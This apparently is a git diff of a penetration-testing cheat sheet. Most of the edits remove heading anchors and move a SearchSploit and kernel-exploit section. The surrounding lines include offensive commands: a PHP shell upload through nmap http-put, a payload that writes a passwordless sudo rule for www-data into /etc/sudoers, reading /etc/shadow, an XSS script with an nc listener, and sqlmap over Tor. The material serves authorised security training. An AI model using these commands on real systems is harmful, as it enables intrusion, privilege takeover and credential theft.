@@ -36,7 +36,7 @@ export ip=192.168.1.100`**_
 - [The Metasploit Framework](#the-metasploit-framework)
 - [Bypassing Antivirus Software](#bypassing-antivirus-software)
 
-<span id="_hjn6h4eyfk2e" class="anchor"><span id="_Toc480741801" class="anchor"></span></span>Kali Linux
+Kali Linux
 ========================================================================================================
 
 -   Set the Target IP Address to the $ip system variable  
@@ -181,10 +181,10 @@ export ip=192.168.1.100`**_
     -   `iptables -A INPUT -p tcp --destination-port 13327 \\! -d $ip -j DROP  `
         `iptables -A INPUT -p tcp --destination-port 4444 \\! -d $ip -j DROP`
 
-<span id="_8ycb0mapaec8" class="anchor"><span id="_Toc480741802" class="anchor"></span></span>Information Gathering & Vulnerability Scanning
-============================================================================================================================================
+Information Gathering & Vulnerability Scanning
+===================================================================================================================================
 
--   <span id="_buep9pyclcqm" class="anchor"><span id="_Toc480741803" class="anchor"></span></span>Passive Information Gathering
+-   Passive Information Gathering
     ---------------------------------------------------------------------------------------------------------------------------
 
 -   Google Hacking
@@ -236,7 +236,7 @@ export ip=192.168.1.100`**_
         `show modules  `
         `help`
 
--   <span id="_freheegw7nba" class="anchor"><span id="_Toc480741804" class="anchor"></span></span>Active Information Gathering
+-   Active Information Gathering
     --------------------------------------------------------------------------------------------------------------------------
 
 <!-- -->
@@ -273,7 +273,7 @@ export ip=192.168.1.100`**_
     -   DNSEnum  
         `dnsenum zonetransfer.me`
 
--   <span id="_rg4aghc59hwr" class="anchor"><span id="_Toc480741805" class="anchor"></span></span>Port Scanning
+-   Port Scanning
     -----------------------------------------------------------------------------------------------------------
 *Subnet Reference Table*
 
@@ -951,7 +951,7 @@ File Transfers
     nmap -p80 $ip --script http-put --script-args
     http-put.url='/test/sicpwn.php',http-put.file='/var/www/html/sicpwn.php
 
--   <span id="_7d17079zlg8e" class="anchor"><span id="_Toc480741812" class="anchor"></span></span>Uploading Files
+-   Uploading Files
     -------------------------------------------------------------------------------------------------------------
 
     -   Upload shell using limited php shell cmd  
@@ -1002,10 +1002,10 @@ File Transfers
         cd setup  
         setup.sh -c
 
-<span id="_603sebbhi52g" class="anchor"><span id="_Toc480741813" class="anchor"></span></span>Privilege Escalation
+Privilege Escalation
 ==================================================================================================================
 
--   <span id="_8xvj7n3ui3gv" class="anchor"><span id="_Toc480741814" class="anchor"></span></span>Linux Privilege Escalation
+-   Linux Privilege Escalation
     ------------------------------------------------------------------------------------------------------------------------
 
 -   Try the obvious - Maybe the user can sudo to root:  
@@ -1095,6 +1095,19 @@ File Transfers
     echo 'chmod 777 /etc/sudoers && echo "www-data ALL=NOPASSWD:
     ALL" &gt;&gt; /etc/sudoers && chmod 440 /etc/sudoers' &gt;
     /tmp/update
+    
+ -   SearchSploit  
+     searchsploit –uncsearchsploit apache 2.2  
+     searchsploit "Linux Kernel"  
+     searchsploit linux 2.6 | grep -i ubuntu | grep local  
+     searchsploit slmail
+
+ -   Kernel Exploit Suggestions for Kernel Version 3.0.0  
+     ./usr/share/linux-exploit-suggester/Linux\_Exploit\_Suggester.pl -k 3.0.0
+
+-   Precompiled Linux Kernel Exploits  - ***Super handy if GCC is not installed on the target machine!***
+
+    [*https://www.kernel-exploits.com/*](https://www.kernel-exploits.com/)    
 
 -   Collect root password  
     cat /etc/shadow |grep root
@@ -1102,7 +1115,7 @@ File Transfers
 -   Find and display the proof.txt or flag.txt - LOOT!
     `cat ``find / -name proof.txt -print```
 
--   <span id="_jo4fgtcuuk6l" class="anchor"><span id="_Toc480741815" class="anchor"></span></span>Windows Privilege Escalation
+-   Windows Privilege Escalation
     --------------------------------------------------------------------------------------------------------------------------
 
 -   Windows MS11-080 - http://www.exploit-db.com/exploits/18176/  
@@ -1156,21 +1169,6 @@ File Transfers
     `dir /b /s proof.txt`
     `type c:\pathto\proof.txt`
     
-
--   Searching for Exploits
-
-    -   SearchSploit  
-        searchsploit –uncsearchsploit apache 2.2  
-        searchsploit "Linux Kernel"  
-        searchsploit linux 2.6 | grep -i ubuntu | grep local  
-        searchsploit slmail
-
-    -   Kernel Exploit Suggestions for Kernel Version 3.0.0  
-        ./usr/share/linux-exploit-suggester/Linux\_Exploit\_Suggester.pl
-        -k 3.0.0
-
--   Precompiled Linux Kernel Exploits  - ***Super handy if GCC is not installed on the target machine!***
-    [*https://www.kernel-exploits.com/*](https://www.kernel-exploits.com/)    
 
 Client, Web and Password Attacks
 ==============================================================================================================================
@@ -1246,7 +1244,7 @@ Client, Web and Password Attacks
         &lt;/script&gt;  
         nc -nlvp 80
 
--   <span id="_bf4kx5ncvlwa" class="anchor"><span id="_Toc480741819" class="anchor"></span></span>File Inclusion Vulnerabilities 
+-   File Inclusion Vulnerabilities 
     -----------------------------------------------------------------------------------------------------------------------------
 
     -   Local (LFI) and remote (RFI) file inclusion vulnerabilities are
@@ -1439,7 +1437,7 @@ Client, Web and Password Attacks
 > sqlmap --tor --tor-type=SOCKS5 --check-tor --dbms=mysql -u "$URL"
 > --dbs
 
--   <span id="_d4rul8c0g2bt" class="anchor"><span id="_Toc480741821" class="anchor"></span></span>Password Attacks
+-   Password Attacks
     --------------------------------------------------------------------------------------------------------------
 
     -   AES Decryption  
